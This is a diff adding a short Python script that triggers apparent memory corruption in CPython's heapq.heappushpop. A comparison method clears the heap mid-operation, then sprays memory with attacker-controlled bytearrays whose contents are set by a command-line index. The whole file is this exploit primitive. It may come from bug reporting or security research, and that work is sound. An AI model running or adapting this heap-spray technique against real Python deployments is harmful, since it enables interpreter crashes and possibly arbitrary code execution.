@@ -1,0 +1,19 @@
+import heapq, sys
+test_idx = int(sys.argv[1])
+class Evil1:
+    def __eq__(self, other):
+        dummy = [(i, i) for i in range(10000)]
+        del dummy
+        heap.clear()
+        payload = bytearray(b'\x41' * 31)
+        if test_idx >= 0:
+            for j in range(8):
+                payload[test_idx*8 + j] = 0
+        global spray
+        spray = [bytearray(payload) for _ in range(10000)]
+        return True
+class Evil2:
+    def __gt__(self, other): return True
+heap = [(Evil1(), 0)]
+try: heapq.heappushpop(heap, (0, Evil2()))
+except Exception as e: pass
